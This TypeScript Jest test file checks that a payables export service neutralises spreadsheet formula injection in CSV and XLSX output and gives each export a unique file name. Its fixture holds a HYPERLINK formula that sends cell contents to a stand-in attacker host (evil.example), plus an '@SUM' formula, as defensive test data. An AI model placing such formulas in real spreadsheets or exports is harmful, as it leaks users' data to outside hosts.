import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import * as xlsx from 'xlsx';
import type { Payable } from '@/entities/payable.entity';
import { ExportFormat } from '@/modules/payables/dto/filter-payables.dto';
import { PayablesExportService } from '@/modules/payables/payables-export.service';

describe('PayablesExportService', () => {
  const tmp = path.join(os.tmpdir(), `seneca-payables-export-${Date.now()}`);
  const previousUploadsDir = process.env.UPLOADS_DIR;
  const service = new PayablesExportService();

  const payable = {
    vendor: '=HYPERLINK("http://evil.example/?"&A1,"x")',
    amount: 10,
    currency: 'EUR',
    dueDate: '2026-10-01',
    status: 'to_pay',
    source: 'manual',
    isRecurring: false,
    comment: '@SUM(1+1)',
    linkedTransactionId: null,
    statementId: null,
    createdAt: new Date('2026-10-01T00:00:00Z'),
    updatedAt: new Date('2026-10-01T00:00:00Z'),
  } as unknown as Payable;

  beforeAll(() => {
    process.env.UPLOADS_DIR = tmp;
  });

  afterAll(() => {
    if (previousUploadsDir === undefined) {
      delete process.env.UPLOADS_DIR;
    } else {
      process.env.UPLOADS_DIR = previousUploadsDir;
    }
    fs.rmSync(tmp, { recursive: true, force: true });
  });

  it('neutralises formula-looking vendor and comment cells in CSV', async () => {
    const result = await service.exportPayables([payable], ExportFormat.CSV);

    const csv = fs.readFileSync(result.filePath, 'utf-8');
    expect(csv).toContain(`"'=HYPERLINK(""http://evil.example/?""&A1,""x"")"`);
    expect(csv).toContain("'@SUM(1+1)");
    expect(csv).not.toMatch(/(^|,)"?=HYPERLINK/m);
  });

  it('neutralises the same cells in XLSX', async () => {
    const result = await service.exportPayables([payable], ExportFormat.EXCEL);

    const sheet = xlsx.readFile(result.filePath).Sheets.Payables;
    expect(sheet.A2.v).toBe(`'${payable.vendor}`);
    expect(sheet.A2.f).toBeUndefined();
  });

  it('gives every export its own file while keeping the readable name', async () => {
    const first = await service.exportPayables([payable], ExportFormat.CSV);
    const second = await service.exportPayables([payable], ExportFormat.CSV);

    expect(first.filePath).not.toBe(second.filePath);
    expect(first.fileName).toMatch(/^payables-.*\.csv$/);
    expect(path.basename(first.filePath)).toMatch(/^[0-9a-f-]{36}-payables-.*\.csv$/);
  });
});
